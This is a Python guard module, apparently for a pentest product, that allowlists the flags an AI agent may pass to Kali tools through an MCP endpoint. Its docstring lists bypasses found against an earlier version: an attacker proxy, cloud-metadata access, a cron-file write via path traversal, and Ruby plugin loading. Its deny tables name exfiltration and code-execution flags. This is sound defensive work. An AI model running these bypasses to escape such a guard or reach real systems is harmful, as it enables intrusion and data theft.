"""Command admission for the inbound MCP `kali_exec` tool.

WHY THIS MODULE EXISTS
----------------------
`kali_shell` is `bash -c` on a container with NET_ADMIN, NET_RAW,
seccomp:unconfined and open egress. Inside the product that is contained by a
HUMAN clicking through the `DANGEROUS_TOOLS` confirmation
(`REQUIRE_TOOL_CONFIRMATION`). An MCP token has no human, so this module stands
in that place. It is the security boundary of the whole feature.

The Rules of Engagement gate matches on TOOL NAME only and never reads a command
string; the scope guardrail runs once per session against the project's
configured target. Neither would notice `nmap -sS victim.tld`, so neither is
sufficient here.

WHY IT IS SHAPED THIS WAY (this is the important part)
------------------------------------------------------
The first version pattern-matched arguments to guess which ones named a host,
and let everything it did not recognise through. An adversarial review broke it
ten different ways in one pass, all the same root cause: **a token the guard
declined to recognise was a token nobody checked**, and the "a network tool must
name at least one in-scope host" rule meant one good argument laundered all the
others. Confirmed bypasses included:

    curl --resolve=acme.tld:443:6.6.6.6 https://acme.tld/   (two colons -> unparsed)
    curl -xevil.tld:8080 acme.tld                           (attached short value -> skipped)
    curl acme.tld evil.tld/                                 (a trailing slash -> unparsed)
    curl acme.tld 169.254.169.254/latest/meta-data/         (cloud metadata)
    curl -o /workspace/../etc/cron.d/pwn https://acme.tld/  (prefix match, no normalisation)
    whatweb --plugins=+/tmp/p.rb https://acme.tld           (loads Ruby from a writable dir)
    dig @evil.tld acme.tld                                  (arbitrary nameserver)
    curl -K/tmp/c acme.tld                                  (config file = arbitrary curl)

So this is now DENY BY DEFAULT OVER THE FLAG SURFACE. Each binary declares every
flag it accepts and what KIND of value that flag takes; a token that is not in
the spec is refused by name. There are no unrecognised tokens, so there is
nothing to launder. The tools' own flag surfaces are the attack surface, and
that is what an allowlist has to cover.

TWO THINGS IT STILL CANNOT DO, BY CONSTRUCTION
----------------------------------------------
A pre-flight string check cannot see a REDIRECT or a DNS answer. `-L` is
therefore not allowed (the target would choose the next hop), and a hostile
in-scope DNS record still resolves where it likes. Closing those needs a runtime
egress policy on the resolved IP, which `scanners/capture_proxy/egress.py`
already implements for the capture path; routing this egress through it would
make the whole class unreachable even when this parser is wrong, which it will
be again. Tracked, not done here.
"""
from __future__ import annotations

import ipaddress
import posixpath
import re
import shlex
from dataclasses import dataclass, field
from urllib.parse import urlsplit

MAX_COMMAND_CHARS = 2000
MAX_ARGS = 64

# --- value kinds --------------------------------------------------------------

BOOL = "bool"        # takes no value
HOST = "host"        # must resolve to an in-scope host, URL or IP
PATH = "path"        # must be an absolute path inside this project's writable roots
OPAQUE = "opaque"    # free text; may not name a host, a path or a file reference
RRTYPE = "rrtype"    # a DNS record type, from a closed set
CHOICE = "choice"    # one of this binary's `choices`, for subcommand-style tools
TEXT = "text"        # free text that MAY contain a URL: headers, bodies, UA, referer

# TEXT exists because OPAQUE refuses anything containing "://", and that made
# three ordinary things impossible:
#
#     curl -H 'Origin: https://evil.tld' ...   <- CORS testing
#     curl -e https://referring.site/ ...      <- referer-based checks
#     curl -d 'callback=https://x/' ...        <- SSRF probes against the TARGET
#
# A URL in a HEADER or a BODY is data the target reads, not a destination this
# process connects to: curl dials the URL slot and nothing else. The slots that
# do steer the connection (the positional, --url, --resolve, --connect-to, -x,
# -K) stay HOST or denied. `@file` is still refused here, because curl reads a
# local file for -H, -d, -b and -w alike.

# `dig NAME TYPE` takes the record type as a second POSITIONAL. Typing it HOST
# refused every ordinary `dig acme.tld MX`; typing it OPAQUE would leave a
# positional slot unchecked, which is the mistake this module was rewritten to
# stop. A closed set is both correct and total.
DNS_RECORD_TYPES = frozenset({
    "a", "aaaa", "any", "caa", "cname", "ds", "dnskey", "hinfo", "mx", "naptr",
    "ns", "nsec", "ptr", "rrsig", "soa", "spf", "srv", "sshfp", "tlsa", "txt",
})


@dataclass(frozen=True)
class BinarySpec:
    """Everything one allowlisted program may be given."""
    flags: dict[str, str]
    positional: str = OPAQUE
    # Kind for positionals AFTER the first. None means they all take `positional`.
    positional_rest: str | None = None
    max_positional: int = 4
    # Appended to every invocation. Bounds that the caller must not be able to
    # remove, so they are added rather than merely required.
    inject: tuple[str, ...] = ()
    network: bool = True
    # Refused with a specific reason rather than the generic "unknown flag",
    # because these are the ones an agent will reach for first.
    denied: dict[str, str] = field(default_factory=dict)
    # The closed set a CHOICE slot accepts. Subcommand-style tools (`amass enum`,
    # `openssl s_client`, `dalfox url`) put the dangerous half of the program
    # behind a verb, so the verb has to be checked like any other value: OPAQUE
    # there would admit `openssl req` and `amass intel -script`.
    choices: frozenset[str] = frozenset()


_CURL_DENIED = {
    "-K": "a curl config file can set any option, including a second URL and file:// - the guard cannot see inside it",
    "--config": "a curl config file can set any option, including a second URL and file:// - the guard cannot see inside it",
    "--resolve": "it repoints a hostname at an arbitrary address, which defeats the scope check entirely",
    "--connect-to": "it repoints a hostname at an arbitrary address, which defeats the scope check entirely",
    "-x": "an arbitrary proxy is arbitrary egress",
    "--proxy": "an arbitrary proxy is arbitrary egress",
    "--variable": "curl variables expand environment variables, which would read the sandbox's secrets",
    "--expand-write-out": "curl variable expansion would read the sandbox's secrets",
    "--expand-url": "curl variable expansion would read the sandbox's secrets",
    "-L": "a redirect lets the TARGET choose the next host, which this pre-flight check cannot see. Read the Location header and request it explicitly.",
    "--location": "a redirect lets the TARGET choose the next host, which this pre-flight check cannot see. Read the Location header and request it explicitly.",
    "-T": "an upload sends local files off the box",
    "--upload-file": "an upload sends local files off the box",
    "-F": "form fields can read local files with @",
    "--form": "form fields can read local files with @",
}

SPECS: dict[str, BinarySpec] = {
    "curl": BinarySpec(
        flags={
            "-s": BOOL, "--silent": BOOL, "-S": BOOL, "--show-error": BOOL,
            "-i": BOOL, "--include": BOOL, "-I": BOOL, "--head": BOOL,
            "-k": BOOL, "--insecure": BOOL, "-v": BOOL, "--verbose": BOOL,
            "--compressed": BOOL, "--http1.1": BOOL, "--http2": BOOL,
            "-g": BOOL, "--globoff": BOOL, "-4": BOOL, "-6": BOOL,
            "-A": TEXT, "--user-agent": TEXT,
            "-H": TEXT, "--header": TEXT,
            "-X": OPAQUE, "--request": OPAQUE,
            "-d": TEXT, "--data": TEXT, "--data-raw": TEXT,
            "--data-urlencode": TEXT,
            "-e": TEXT, "--referer": TEXT,
            "-b": TEXT, "--cookie": TEXT,
            "-G": BOOL, "--get": BOOL,
            "-D": PATH, "--dump-header": PATH,
            "-r": OPAQUE, "--range": OPAQUE,
            "-w": OPAQUE, "--write-out": OPAQUE,
            "-m": OPAQUE, "--max-time": OPAQUE,
            "--connect-timeout": OPAQUE,
            "-o": PATH, "--output": PATH,
            "--url": HOST,
        },
        positional=HOST,
        # Bounds the caller cannot drop: `kali_shell` buffers the whole response
        # in RAM inside a 1 GB container shared with every project and the in-app
        # agent, so an unbounded body is a denial of service. --proto keeps a
        # scheme the guard did not vet out of reach.
        inject=("--proto", "=http,https", "--max-time", "120", "--max-filesize", "10000000"),
        denied=_CURL_DENIED,
    ),
    "dig": BinarySpec(
        flags={
            "+short": BOOL, "+noall": BOOL, "+answer": BOOL, "+trace": BOOL,
            "+dnssec": BOOL, "+nocmd": BOOL, "+multiline": BOOL, "+tcp": BOOL,
            "-4": BOOL, "-6": BOOL, "-t": OPAQUE, "-x": OPAQUE,
        },
        positional=HOST, positional_rest=RRTYPE, max_positional=2,
        denied={"-f": "a batch file would be read from disk and each line queried unchecked"},
    ),
    "host": BinarySpec(
        flags={"-t": OPAQUE, "-a": BOOL, "-v": BOOL, "-4": BOOL, "-6": BOOL},
        # `host NAME SERVER` takes a nameserver as a SECOND positional, so one is
        # the limit: an out-of-band DNS channel is still exfiltration.
        positional=HOST, max_positional=1,
    ),
    "nslookup": BinarySpec(
        flags={"-type": OPAQUE, "-query": OPAQUE, "-debug": BOOL},
        positional=HOST, max_positional=1,
    ),
    "dnsrecon": BinarySpec(
        flags={
            "-d": HOST, "--domain": HOST, "-t": OPAQUE, "--type": OPAQUE,
            "-D": PATH, "--dictionary": PATH, "-a": BOOL, "-s": BOOL,
            "-z": BOOL, "-k": BOOL, "-w": BOOL, "-j": PATH, "--json": PATH,
        },
        positional=OPAQUE, max_positional=0,
        denied={
            "-n": "an arbitrary nameserver is an out-of-band exfiltration channel",
            "--name_server": "an arbitrary nameserver is an out-of-band exfiltration channel",
        },
    ),
    "whatweb": BinarySpec(
        flags={
            "-a": OPAQUE, "--aggression": OPAQUE, "-v": BOOL, "--verbose": BOOL,
            "--no-errors": BOOL, "-t": OPAQUE, "--max-threads": OPAQUE,
            "--open-timeout": OPAQUE, "--read-timeout": OPAQUE,
            "-U": TEXT, "--user-agent": TEXT, "--log-brief": PATH,
        },
        positional=HOST,
        denied={
            "-p": "whatweb loads plugins as Ruby source, from a directory this tool can write to",
            "--plugins": "whatweb loads plugins as Ruby source, from a directory this tool can write to",
            "--custom-plugin": "it executes caller-supplied Ruby",
            "--load-plugin": "it executes caller-supplied Ruby",
        },
    ),
    "nikto": BinarySpec(
        flags={
            "-h": HOST, "-host": HOST, "-p": OPAQUE, "-port": OPAQUE,
            "-ssl": BOOL, "-nossl": BOOL, "-nointeractive": BOOL,
            "-maxtime": OPAQUE, "-Tuning": OPAQUE, "-timeout": OPAQUE,
            "-useragent": TEXT, "-o": PATH, "-output": PATH, "-Format": OPAQUE,
        },
        positional=OPAQUE, max_positional=0,
        denied={
            "-config": "a nikto config file sets PLUGINDIR, EXECDIR and CLIOPTS, which the guard cannot see inside",
            "-Plugins": "it selects plugin code to load",
            "-Save": "it writes captured responses to an arbitrary directory",
        },
    ),
    "testssl": BinarySpec(
        flags={
            "--fast": BOOL, "--quiet": BOOL, "--protocols": BOOL, "--headers": BOOL,
            "--vulnerable": BOOL, "--standard": BOOL, "--server-defaults": BOOL,
            "--server-preference": BOOL, "--cipher-per-proto": BOOL, "--sneaky": BOOL,
            "--color": OPAQUE, "--severity": OPAQUE, "--jsonfile": PATH, "--logfile": PATH,
        },
        positional=HOST, max_positional=1,
        denied={
            "--openssl": "it runs a caller-named binary",
            "--bin": "it runs a caller-named binary",
            "--file": "a batch file names its own targets, which the guard cannot see",
        },
    ),
    "searchsploit": BinarySpec(
        flags={"-j": BOOL, "--json": BOOL, "-w": BOOL, "-t": BOOL, "--title": BOOL,
               "-e": BOOL, "--exact": BOOL, "-c": BOOL, "--case": BOOL},
        positional=OPAQUE, max_positional=8, network=False,
        denied={
            "--nmap": "it reads and parses a caller-named file",
            "-m": "it copies an exploit out of the database to an arbitrary path",
            "--mirror": "it copies an exploit out of the database to an arbitrary path",
        },
    ),

    # --- port and service discovery -------------------------------------------
    "nmap": BinarySpec(
        flags={
            "-sV": BOOL, "-sT": BOOL, "-sS": BOOL, "-sU": BOOL, "-sn": BOOL,
            "-Pn": BOOL, "-n": BOOL, "-F": BOOL, "-r": BOOL, "-v": BOOL, "-vv": BOOL,
            "-6": BOOL, "-4": BOOL, "--open": BOOL, "--reason": BOOL, "-O": BOOL,
            "-T0": BOOL, "-T1": BOOL, "-T2": BOOL, "-T3": BOOL, "-T4": BOOL, "-T5": BOOL,
            "-p": OPAQUE, "--top-ports": OPAQUE, "--version-intensity": OPAQUE,
            "--max-retries": OPAQUE, "--host-timeout": OPAQUE, "--max-rate": OPAQUE,
            "--min-rate": OPAQUE, "--scan-delay": OPAQUE, "--version-all": BOOL,
            "-oN": PATH, "-oX": PATH, "-oG": PATH,
        },
        positional=HOST, max_positional=2,
        denied={
            # NSE is a Lua interpreter with io and os bound. `--script` from a
            # directory this tool can write to is straightforward RCE, and -sC
            # and -A both turn it on without naming it.
            "--script": "NSE runs Lua with filesystem and process access; a script from a writable directory is arbitrary code execution",
            "--script-args": "it configures NSE, which is not available here",
            "--script-args-file": "it configures NSE, which is not available here",
            "--script-help": "it loads NSE scripts to describe them",
            "--script-trace": "it configures NSE, which is not available here",
            "-sC": "it is an alias for --script=default, and NSE is not available here",
            "-A": "it implies -sC, which runs NSE scripts",
            "--datadir": "it repoints nmap at caller-supplied data files, including its NSE tree",
            "--servicedb": "it repoints nmap at a caller-supplied database file",
            "--versiondb": "it repoints nmap at a caller-supplied database file",
            "-iL": "a target list file names its own targets, which the guard cannot see",
            "-iR": "it picks random internet hosts, which by definition are out of scope",
            "--resume": "it reads targets from a previous run's output file",
            "--excludefile": "it reads a caller-named file",
            "--stylesheet": "it fetches and applies a caller-named XSL file",
            "-oA": "it writes three files from one prefix; use -oN, -oX or -oG with an explicit path",
            "-oS": "script-kiddie output is not parseable and hides what was found",
        },
    ),
    "naabu": BinarySpec(
        flags={
            "-host": HOST, "-p": OPAQUE, "-port": OPAQUE, "-top-ports": OPAQUE,
            "-tp": OPAQUE, "-exclude-ports": OPAQUE, "-ep": OPAQUE,
            "-json": BOOL, "-silent": BOOL, "-nc": BOOL, "-v": BOOL, "-Pn": BOOL,
            "-sn": BOOL, "-verify": BOOL, "-s": OPAQUE, "-scan-type": OPAQUE,
            "-rate": OPAQUE, "-c": OPAQUE, "-timeout": OPAQUE, "-retries": OPAQUE,
            "-warm-up-time": OPAQUE, "-o": PATH, "-output": PATH,
        },
        positional=OPAQUE, max_positional=0,
        denied={
            # -nmap-cli hands a caller-controlled string to nmap, which re-opens
            # --script and every other thing nmap's own spec denies.
            "-nmap-cli": "it passes a caller-written command line to nmap, which would re-open --script and every flag nmap's own allowlist denies",
            "-nmap": "it passes a caller-written command line to nmap",
            "-config": "a config file can set any option, which the guard cannot see inside",
            "-l": "a target list file names its own targets",
            "-list": "a target list file names its own targets",
            "-exclude-file": "it reads a caller-named file",
            "-proxy": "an arbitrary proxy is arbitrary egress",
            "-r": "an arbitrary resolver is an out-of-band exfiltration channel",
            "-resolvers": "an arbitrary resolver is an out-of-band exfiltration channel",
        },
    ),

    # --- HTTP probing and crawling --------------------------------------------
    "httpx": BinarySpec(
        flags={
            "-u": HOST, "-target": HOST, "-path": OPAQUE,
            "-silent": BOOL, "-json": BOOL, "-nc": BOOL, "-no-color": BOOL,
            "-title": BOOL, "-sc": BOOL, "-status-code": BOOL,
            "-td": BOOL, "-tech-detect": BOOL, "-server": BOOL, "-web-server": BOOL,
            "-ip": BOOL, "-cdn": BOOL, "-cl": BOOL, "-content-length": BOOL,
            "-location": BOOL, "-method": BOOL, "-websocket": BOOL, "-probe": BOOL,
            "-favicon": BOOL, "-jarm": BOOL, "-tls-grab": BOOL, "-tls-probe": BOOL,
            "-cname": BOOL, "-asn": BOOL, "-hash": OPAQUE, "-vhost": BOOL,
            "-H": TEXT, "-x": OPAQUE, "-body": TEXT,
            "-timeout": OPAQUE, "-retries": OPAQUE, "-t": OPAQUE, "-threads": OPAQUE,
            "-rl": OPAQUE, "-rate-limit": OPAQUE, "-p": OPAQUE, "-ports": OPAQUE,
            "-mc": OPAQUE, "-match-code": OPAQUE, "-fc": OPAQUE, "-filter-code": OPAQUE,
            "-o": PATH, "-output": PATH,
        },
        positional=OPAQUE, max_positional=0,
        denied={
            "-config": "a config file can set any option, which the guard cannot see inside",
            "-l": "a target list file names its own targets",
            "-list": "a target list file names its own targets",
            "-request": "it replays a raw request read from a file, including its own Host and URL",
            "-rr": "it replays a raw request read from a file",
            "-http-proxy": "an arbitrary proxy is arbitrary egress",
            "-proxy": "an arbitrary proxy is arbitrary egress",
            "-fr": "a redirect lets the TARGET choose the next host, which this pre-flight check cannot see",
            "-follow-redirects": "a redirect lets the TARGET choose the next host, which this pre-flight check cannot see",
            "-location-redirects": "a redirect lets the TARGET choose the next host",
            "-ss": "screenshotting launches a headless browser, which executes the target's JavaScript",
            "-screenshot": "screenshotting launches a headless browser, which executes the target's JavaScript",
            "-sr": "it writes every response into a directory tree",
            "-store-response": "it writes every response into a directory tree",
            "-srd": "it writes every response into a caller-named directory",
        },
    ),
    "katana": BinarySpec(
        flags={
            "-u": HOST, "-url": HOST,
            "-d": OPAQUE, "-depth": OPAQUE, "-ct": OPAQUE, "-crawl-duration": OPAQUE,
            "-jc": BOOL, "-js-crawl": BOOL, "-kf": OPAQUE, "-known-files": OPAQUE,
            "-silent": BOOL, "-nc": BOOL, "-j": BOOL, "-json": BOOL, "-v": BOOL,
            "-c": OPAQUE, "-concurrency": OPAQUE, "-p": OPAQUE, "-parallelism": OPAQUE,
            "-rd": OPAQUE, "-delay": OPAQUE, "-rl": OPAQUE, "-rate-limit": OPAQUE,
            "-timeout": OPAQUE, "-retry": OPAQUE, "-mrs": OPAQUE,
            "-H": TEXT, "-f": OPAQUE, "-field": OPAQUE, "-em": OPAQUE, "-ef": OPAQUE,
            "-o": PATH, "-output": PATH,
        },
        positional=OPAQUE, max_positional=0,
        # A crawler follows links the TARGET writes, so its own scope rule is the
        # only thing keeping it on the domain the guard checked. `rdn` (root
        # domain) is appended rather than merely required so the caller cannot
        # widen it back out.
        inject=("-field-scope", "rdn"),
        denied={
            "-config": "a config file can set any option, which the guard cannot see inside",
            "-list": "a target list file names its own targets",
            "-proxy": "an arbitrary proxy is arbitrary egress",
            "-cos": "crawl-out-scope widens the crawl past the host the guard checked",
            "-crawl-out-scope": "crawl-out-scope widens the crawl past the host the guard checked",
            "-do": "displaying out-of-scope output means it crawled out of scope",
            "-fs": "the crawl's field scope is fixed to the root domain and cannot be widened",
            "-field-scope": "the crawl's field scope is fixed to the root domain and cannot be widened",
            "-hl": "headless mode launches a browser that executes the target's JavaScript",
            "-headless": "headless mode launches a browser that executes the target's JavaScript",
            "-sc": "system-chrome runs a browser binary of the caller's choosing",
            "-system-chrome": "system-chrome runs a browser binary of the caller's choosing",
            "-cdd": "it writes a browser profile into a caller-named directory",
            "-aff": "automatic form fill submits data to the target",
            "-sf": "it writes every matched field into a directory tree",
            "-store-field": "it writes every matched field into a directory tree",
        },
    ),

    # --- DNS and subdomains ----------------------------------------------------
    "dnsx": BinarySpec(
        flags={
            "-d": HOST, "-domain": HOST,
            "-a": BOOL, "-aaaa": BOOL, "-cname": BOOL, "-ns": BOOL, "-txt": BOOL,
            "-mx": BOOL, "-soa": BOOL, "-ptr": BOOL, "-caa": BOOL, "-axfr": BOOL,
            "-json": BOOL, "-silent": BOOL, "-nc": BOOL, "-resp": BOOL,
            "-resp-only": BOOL, "-recon": BOOL, "-re": BOOL,
            "-t": OPAQUE, "-threads": OPAQUE, "-rl": OPAQUE, "-rate-limit": OPAQUE,
            "-retry": OPAQUE, "-o": PATH, "-output": PATH, "-w": PATH, "-wordlist": PATH,
        },
        positional=OPAQUE, max_positional=0,
        denied={
            "-r": "an arbitrary resolver is an out-of-band exfiltration channel",
            "-resolver": "an arbitrary resolver is an out-of-band exfiltration channel",
            "-config": "a config file can set any option, which the guard cannot see inside",
            "-l": "a target list file names its own targets",
            "-list": "a target list file names its own targets",
        },
    ),
    "subfinder": BinarySpec(
        flags={
            "-d": HOST, "-domain": HOST,
            "-silent": BOOL, "-json": BOOL, "-oJ": BOOL, "-nc": BOOL, "-all": BOOL,
            "-recursive": BOOL, "-active": BOOL, "-cs": BOOL, "-collect-sources": BOOL,
            "-t": OPAQUE, "-timeout": OPAQUE, "-max-time": OPAQUE,
            "-rl": OPAQUE, "-rate-limit": OPAQUE, "-s": OPAQUE, "-sources": OPAQUE,
            "-es": OPAQUE, "-exclude-sources": OPAQUE,
            "-o": PATH, "-output": PATH,
        },
        positional=OPAQUE, max_positional=0,
        denied={
            "-config": "a config file can set any option, which the guard cannot see inside",
            "-pc": "the provider config holds this deployment's third-party API keys",
            "-provider-config": "the provider config holds this deployment's third-party API keys",
            "-dL": "a domain list file names its own targets",
            "-r": "an arbitrary resolver is an out-of-band exfiltration channel",
            "-rL": "an arbitrary resolver list is an out-of-band exfiltration channel",
            "-proxy": "an arbitrary proxy is arbitrary egress",
        },
    ),
    "amass": BinarySpec(
        flags={
            "-d": HOST, "-passive": BOOL, "-active": BOOL, "-brute": BOOL,
            "-silent": BOOL, "-nocolor": BOOL, "-v": BOOL, "-ip": BOOL, "-ipv4": BOOL,
            "-timeout": OPAQUE, "-max-dns-queries": OPAQUE, "-min-for-recursive": OPAQUE,
            "-o": PATH, "-json": PATH,
        },
        positional=CHOICE, max_positional=1,
        # `amass intel` and `amass viz` reach beyond one domain; `enum` is the
        # only verb whose targets the -d slot fully describes.
        choices=frozenset({"enum"}),
        denied={
            "-script": "amass runs caller-supplied Lua scripts from this directory",
            "-config": "a config file sets data sources and credentials, which the guard cannot see inside",
            "-df": "a domain list file names its own targets",
            "-r": "an arbitrary resolver is an out-of-band exfiltration channel",
            "-rf": "an arbitrary resolver list is an out-of-band exfiltration channel",
            "-dir": "it writes a graph database into a caller-named directory",
            "-w": "a brute-force wordlist belongs to an active attack, not a read-only observation",
        },
    ),
    "subzy": BinarySpec(
        flags={
            "--target": HOST, "--targets": PATH, "--output": PATH,
            "--hide_fails": BOOL, "--https": BOOL, "--verify_ssl": BOOL,
            "--vuln": BOOL, "--concurrency": OPAQUE, "--timeout": OPAQUE,
        },
        positional=CHOICE, max_positional=1,
        choices=frozenset({"run"}),
        denied={
            "--config": "a config file can set any option, which the guard cannot see inside",
        },
    ),

    # --- web application scanning ---------------------------------------------
    "nuclei": BinarySpec(
        flags={
            "-u": HOST, "-target": HOST,
            "-tags": OPAQUE, "-etags": OPAQUE, "-itags": OPAQUE,
            "-s": OPAQUE, "-severity": OPAQUE, "-es": OPAQUE, "-exclude-severity": OPAQUE,
            "-id": OPAQUE, "-eid": OPAQUE, "-pt": OPAQUE, "-type": OPAQUE,
            "-a": OPAQUE, "-author": OPAQUE, "-protocol-type": OPAQUE,
            "-json": BOOL, "-jsonl": BOOL, "-silent": BOOL, "-nc": BOOL,
            "-stats": BOOL, "-v": BOOL, "-vv": BOOL, "-ni": BOOL, "-no-interactsh": BOOL,
            "-duc": BOOL, "-disable-update-check": BOOL, "-nm": BOOL, "-no-meta": BOOL,
            "-H": TEXT, "-c": OPAQUE, "-concurrency": OPAQUE,
            "-rl": OPAQUE, "-rate-limit": OPAQUE, "-timeout": OPAQUE,
            "-retries": OPAQUE, "-mhe": OPAQUE, "-bs": OPAQUE, "-headless": BOOL,
            "-o": PATH, "-output": PATH, "-je": PATH,
        },
        positional=OPAQUE, max_positional=0,
        # Two bounds the caller must not be able to drop. interactsh is a PUBLIC
        # third-party collector: this codebase has already had a live session
        # cookie leak to it, so OAST stays off. The update check silently fetches
        # and REPLACES the template tree mid-run, which would defeat the point of
        # denying -t.
        inject=("-no-interactsh", "-disable-update-check"),
        denied={
            "-t": "a template is executable content - nuclei templates have a `code` protocol - and a template from a writable directory is arbitrary code execution",
            "-templates": "a template is executable content; only the built-in template set is available, selected with -tags, -id or -severity",
            "-tu": "it fetches templates from a caller-named URL",
            "-template-url": "it fetches templates from a caller-named URL",
            "-w": "a workflow chains caller-supplied templates",
            "-workflows": "a workflow chains caller-supplied templates",
            "-wu": "it fetches workflows from a caller-named URL",
            "-workflow-url": "it fetches workflows from a caller-named URL",
            "-code": "it enables the template `code` protocol, which executes arbitrary programs",
            "-ud": "it repoints nuclei at a caller-controlled template directory",
            "-templates-directory": "it repoints nuclei at a caller-controlled template directory",
            "-config": "a config file can set any option, including -t",
            "-tp": "a template profile selects templates from a caller-named file",
            "-l": "a target list file names its own targets",
            "-list": "a target list file names its own targets",
            "-proxy": "an arbitrary proxy is arbitrary egress",
            "-iserver": "a caller-named interaction server is an out-of-band exfiltration channel",
            "-interactsh-server": "a caller-named interaction server is an out-of-band exfiltration channel",
            "-sr": "it writes every response into a directory tree",
            "-store-resp": "it writes every response into a directory tree",
        },
    ),
    "wpscan": BinarySpec(
        flags={
            "--url": HOST, "-e": OPAQUE, "--enumerate": OPAQUE,
            "--format": OPAQUE, "-f": OPAQUE, "-o": PATH, "--output": PATH,
            "--random-user-agent": BOOL, "--no-update": BOOL, "--force": BOOL,
            "--disable-tls-checks": BOOL, "--no-banner": BOOL,
            "-t": OPAQUE, "--max-threads": OPAQUE,
            "--request-timeout": OPAQUE, "--connect-timeout": OPAQUE,
            "--throttle": BOOL, "--detection-mode": OPAQUE,
            "--plugins-detection": OPAQUE, "--plugins-version-detection": OPAQUE,
            "--user-agent": TEXT,
        },
        positional=OPAQUE, max_positional=0,
        denied={
            "-P": "a password attack is an active intrusion, not a read-only observation",
            "--passwords": "a password attack is an active intrusion, not a read-only observation",
            "-U": "a username list belongs to a password attack",
            "--usernames": "a username list belongs to a password attack",
            "--password-attack": "a password attack is an active intrusion",
            "-w": "a brute-force wordlist belongs to an active attack",
            "--wordlist": "a brute-force wordlist belongs to an active attack",
            "--api-token": "it would carry a credential into the command line and the audit log",
            "--proxy": "an arbitrary proxy is arbitrary egress",
            "--proxy-auth": "it would carry a credential into the command line",
            "--http-auth": "it would carry a credential into the command line",
            "--cli-options": "it reads more options from a caller-named file",
            "--config-file": "a config file can set any option, which the guard cannot see inside",
        },
    ),
    "dalfox": BinarySpec(
        flags={
            "--silence": BOOL, "--no-color": BOOL, "--no-spinner": BOOL,
            "--only-poc": OPAQUE, "--format": OPAQUE, "-o": PATH, "--output": PATH,
            "-w": OPAQUE, "--worker": OPAQUE, "--delay": OPAQUE, "--timeout": OPAQUE,
            "-H": TEXT, "--header": TEXT, "--user-agent": TEXT,
            "-d": TEXT, "--data": TEXT, "-X": OPAQUE, "--method": OPAQUE,
            "--cookie": TEXT, "--skip-bav": BOOL, "--skip-mining-all": BOOL,
            "--deep-domxss": BOOL, "--waf-evasion": BOOL, "--follow-redirects": BOOL,
        },
        positional=CHOICE, positional_rest=HOST, max_positional=2,
        choices=frozenset({"url"}),
        denied={
            "--custom-payload": "it reads payloads from a caller-named file",
            "--remote-payloads": "it fetches payloads from a third-party service at run time",
            "--remote-wordlists": "it fetches wordlists from a third-party service at run time",
            "--config": "a config file can set any option, which the guard cannot see inside",
            "--proxy": "an arbitrary proxy is arbitrary egress",
            "-b": "a blind-XSS callback sends findings to a caller-named host, which is out-of-band exfiltration",
            "--blind": "a blind-XSS callback sends findings to a caller-named host, which is out-of-band exfiltration",
            "--grep": "it reads grepping patterns from a caller-named file",
        },
    ),

    # --- parameter and URL mining ----------------------------------------------
    "arjun": BinarySpec(
        flags={
            "-u": HOST, "-m": OPAQUE, "-t": OPAQUE, "-d": OPAQUE, "-T": OPAQUE,
            "-c": OPAQUE, "-q": BOOL, "--stable": BOOL, "--include": OPAQUE,
            "--headers": TEXT, "-w": PATH, "-oJ": PATH, "-oT": PATH, "-oB": PATH,
        },
        positional=OPAQUE, max_positional=0,
        denied={
            "-i": "a target list file names its own targets",
            "--urls": "a target list file names its own targets",
        },
    ),
    "gau": BinarySpec(
        flags={
            "--subs": BOOL, "--json": BOOL, "--verbose": BOOL,
            "--threads": OPAQUE, "--providers": OPAQUE, "--blacklist": OPAQUE,
            "--fc": OPAQUE, "--mc": OPAQUE, "--ft": OPAQUE, "--mt": OPAQUE,
            "--from": OPAQUE, "--to": OPAQUE, "--retries": OPAQUE, "--timeout": OPAQUE,
            "-o": PATH,
        },
        positional=HOST, max_positional=1,
        denied={
            "--config": "a config file can set any option, which the guard cannot see inside",
            "--proxy": "an arbitrary proxy is arbitrary egress",
        },
    ),

    # --- TLS -------------------------------------------------------------------
    "openssl": BinarySpec(
        flags={
            "-connect": HOST, "-servername": OPAQUE, "-showcerts": BOOL,
            "-brief": BOOL, "-status": BOOL, "-tls1": BOOL, "-tls1_1": BOOL,
            "-tls1_2": BOOL, "-tls1_3": BOOL, "-no_ssl3": BOOL, "-cipher": OPAQUE,
            "-ciphersuites": OPAQUE, "-alpn": OPAQUE, "-verify": OPAQUE,
            "-verify_return_error": BOOL, "-prexit": BOOL, "-quiet": BOOL,
            "-no_ign_eof": BOOL, "-starttls": OPAQUE,
        },
        positional=CHOICE, max_positional=1,
        # `s_client` is the only openssl verb that is an observation. `req`,
        # `genrsa` and `enc` write key material; `engine` loads a shared object.
        choices=frozenset({"s_client"}),
        denied={
            "-engine": "it loads a caller-named shared object into the process",
            "-CAfile": "it reads a caller-named file",
            "-cert": "it reads caller-named key material",
            "-key": "it reads caller-named key material",
            "-keylogfile": "it writes TLS secrets to a caller-named file",
            "-sess_out": "it writes session material to a caller-named file",
            "-sess_in": "it reads session material from a caller-named file",
        },
    ),
}

ALLOWED_BINARIES = frozenset(SPECS)
NETWORK_BINARIES = frozenset(n for n, s in SPECS.items() if s.network)
OFFLINE_BINARIES = ALLOWED_BINARIES - NETWORK_BINARIES

# Writable roots. `/workspace` is shared by EVERY project (agent and sandbox bind
# the same host directory), so a bare `/workspace/` prefix let one project read
# and overwrite another's job output. Paths there are confined to the caller's
# own project subtree.
TMP_ROOT = "/tmp/"
WORKSPACE_ROOT = "/workspace/"
# Exactly `/dev/null`, never a `/dev/` prefix: `/dev/tcp/host/port` is a bash
# network primitive and `/dev/mem` is raw memory.
# `-` is stdout for curl's -o/-D, not a filesystem path: `curl -D -` is the
# idiomatic way to read response headers while discarding the body.
WRITABLE_EXACT = frozenset({"/dev/null", "-"})

ALLOWED_URL_SCHEMES = frozenset({"http", "https"})

# Every character here can begin a second command. `{` and `}` are absent
# deliberately: brace expansion only happens UNQUOTED, `shlex.join` quotes every
# argument, and `${...}` needs the `$` that is refused here anyway - while
# refusing braces blocked `curl -w '%{http_code}'`. curl's own variable
# expansion, the other way braces could matter, is denied by flag instead.
_METACHARACTERS = set(";|&$`><()\\\n\r\t\0")

# Underscores are allowed in the non-final labels. They are not legal in a
# HOSTname, but they are legal and routine in a DNS NAME (RFC 8552): _dmarc,
# _domainkey, _acme-challenge, and every SRV record such as _sip._tcp. Without
# them `dig _dmarc.acme.tld TXT` was refused, and a DMARC lookup that cannot be
# asked came back looking like a DMARC record that does not exist - the
# could-not-ask/found-nothing conflation this surface exists to avoid.
#
# It does not widen scope: a broader regex means MORE values are recognised as
# hosts and therefore MORE get scope-checked. Unrecognised is the unsafe side.
_DOMAIN_RE = re.compile(
